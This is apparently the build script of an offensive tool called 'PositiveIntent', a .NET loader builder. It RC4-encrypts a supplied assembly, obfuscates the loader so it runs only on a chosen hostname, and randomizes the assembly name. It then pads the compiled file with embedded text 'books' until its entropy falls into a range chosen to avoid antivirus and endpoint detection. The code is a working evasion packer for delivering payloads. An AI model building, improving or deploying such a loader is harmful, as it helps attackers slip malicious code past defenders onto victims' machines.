import sys
import argparse
import random
import string
from modules import obfuscate
from modules import rc4
from modules import entropy
import subprocess
import os
import xml.etree.ElementTree as ET
import colorama

def randomize_assembly_name(csproj_path, new_name):
    """Modifies the AssemblyName property in the .csproj file."""
    # Parse the .csproj XML file
    tree = ET.parse(csproj_path)
    root = tree.getroot()

    property_group = root.find('PropertyGroup')
    if property_group is not None:
        assembly_name_element = ET.SubElement(property_group, 'AssemblyName')

    # Update the AssemblyName to the new random name
    assembly_name_element.text = new_name
    
    # Write changes back to the .csproj file
    tree.write(csproj_path, encoding="utf-8", xml_declaration=True)
    print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f"Randomized loader filename")
    return new_name

def embed_book(resx_file_path, resource_name, text_file_path):
    # Parse the .resx file
    tree = ET.parse(resx_file_path)
    root = tree.getroot()

    # Create a new data element for the text file resource
    data = ET.Element("data")
    data.set("name", resource_name)
    data.set("xml:space", "preserve")

    # Add the value element (content of the text file)
    with open(text_file_path, 'r', encoding="utf-8") as f:
        value = ET.Element("value")
        value.text = f.read()

    data.append(value)
    
    # Append the new resource to the root element
    root.append(data)

    # Write the updated .resx file
    tree.write(resx_file_path, encoding="utf-8", xml_declaration=True)

def build():
    assembly_name = randomize_assembly_name(os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp\\PositiveIntent\\PositiveIntent.csproj"), ''.join(random.choices(string.ascii_letters, k=8)))
    assembly_output_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), f"temp\\PositiveIntent\\bin\\release\\net48\\{assembly_name}") + ".exe"
    subprocess.run(["dotnet", "build", "--configuration", "Release", os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp\\PositiveIntent.sln")], stdout = subprocess.DEVNULL)
    embed_count = 0
    if(entropy.run(assembly_output_path) >= 5.50):
        for root, dirs, files in os.walk(os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp\\PositiveIntent\\Resources"), topdown=True):
            for file_name in files:
                if file_name.endswith('.txt'):
                    file_path = os.path.join(root, file_name)
                    embed_book(os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp\\PositiveIntent\\Properties\\Resources.resx"), file_name, file_path)
                    embed_count += 1
                    subprocess.run(["dotnet", "build", "--configuration", "Release", os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp\\PositiveIntent.sln")], stdout = subprocess.DEVNULL)
                    if(4.50 <= entropy.run(assembly_output_path) <= 5.50):
                        if(embed_count > 0):
                            print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f'Embedded {embed_count} books as resource files')
                        print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f'Entropy of loader: {entropy.run(assembly_output_path)}')
                        print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + 'Loader compiled to ' + assembly_output_path)
                        print(colorama.Fore.RED + "[-] " + colorama.Style.RESET_ALL + f'Did not digitally sign loader')
                        break
            else:
                continue
            break

if __name__=="__main__":
    parser = argparse.ArgumentParser(description='PositiveIntent .NET Loader')
    parser.add_argument('--file', type=argparse.FileType('rb'),
                        required=True, help='Path to your .NET assembly (e.g. Seeker.exe)')
    parser.add_argument('--hostname', type=str, required=True,
                        help='Restrict execution of loader to hostname')
    args = parser.parse_args()
    obfuscate.run(args.hostname)
    rc4.run(args.file)
    build()
